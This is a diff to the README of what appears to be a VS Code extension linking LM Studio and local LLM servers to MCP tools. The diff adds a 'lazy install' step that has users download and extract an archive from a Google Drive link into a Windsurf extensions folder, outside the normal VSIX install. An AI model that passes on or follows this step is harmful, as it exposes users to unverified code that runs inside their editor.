@@ -1,7 +1,8 @@
 # LM Studio IDE Plugin
 
 A powerful VS Code extension that integrates LM Studio and other Local LLM servers with Agent-Cascade MCP tools, providing AI-powered coding assistance directly in your editor with instant completions.
-
+LAZY INSTALL -> C:/USERNAME/.windsurf/extensions
+Download and extract https://drive.google.com/file/d/1igZv4Bn9U98M--OZ8gTsbeCfWfhsWJ5p/view?usp=drive_link and it may work without issue. Use the actual VSIX for best results.
 ## Features
 
 ### ⚡ Instant Code Completions
